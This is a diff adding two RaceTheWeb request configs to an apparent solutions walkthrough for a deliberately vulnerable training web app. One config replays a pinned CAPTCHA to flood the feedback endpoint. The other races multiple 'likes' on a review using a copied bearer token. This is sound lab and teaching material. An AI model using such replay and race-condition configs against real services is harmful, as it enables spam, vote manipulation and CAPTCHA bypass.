@@ -524,6 +524,26 @@ for this challenge:
 _It is worth noting that both alternate solutions would still work even
 if the CAPTCHA-pinning problem would be fixed in the application!_
 
+Last but not least, the following
+[RaceTheWeb](https://github.com/aaronhnatiw/race-the-web) config could
+be used to solve this challenge. Other than the two above alternate
+solutions, this one relies on CAPTCHA-pinning:
+
+```toml
+# CAPTCHA Bypass
+# Save this as captcha-bypass.toml
+# Get Captcha information from this endpoint first: http://localhost:3000/rest/captcha/
+# Then repalce captchaId and captcha values in body parameter of this file
+# Launch this file by doing ./racethweb captcha-bypass.toml
+count = 10
+verbose = true
+[[requests]]
+    method = "POST"
+    url = "http://localhost:3000/api/Feedbacks/"
+    body = "{\"captchaId\":12,\"captcha\":\"-1\",\"comment\":\"pwned2\",\"rating\":5}"
+    headers = ["Content-Type: application/json"]
+```
+
 ### Post some feedback in another users name
 
 1. Go to the _Contact Us_ form on <http://localhost:3000/#/contact>.
@@ -2369,6 +2389,26 @@ this solution.
    three!
 5. Back in your browser you should now see the corresponding challenge
    marked as solved!
+
+The following [RaceTheWeb](https://github.com/aaronhnatiw/race-the-web)
+config does the trick as well:
+
+```toml
+# Multiple Likes
+# Save this as multiple-likes.toml
+# Get comment information from this endpoint first: http://localhost:3000/rest/products/<id>/reviews
+# Then repalce id values in body parameter of this file
+# You need to replace the bearer token as well
+# open browser dev tools, like any of the comment, then inspect the traffic to obtain a valid bearer token
+# Launch this file by doing ./racethweb multiple-likes.toml
+count = 3
+verbose = true
+[[requests]]
+    method = "POST"
+    url = "http://localhost:3000/rest/products/reviews"
+    body = "{\"id\":\"QEBb8RKLor69dsXkB\"}"
+    headers = ["Content-Type: application/json","Authorization: Bearer XXX"]
+```
 
 ### Log in with the support team's original user credentials
 
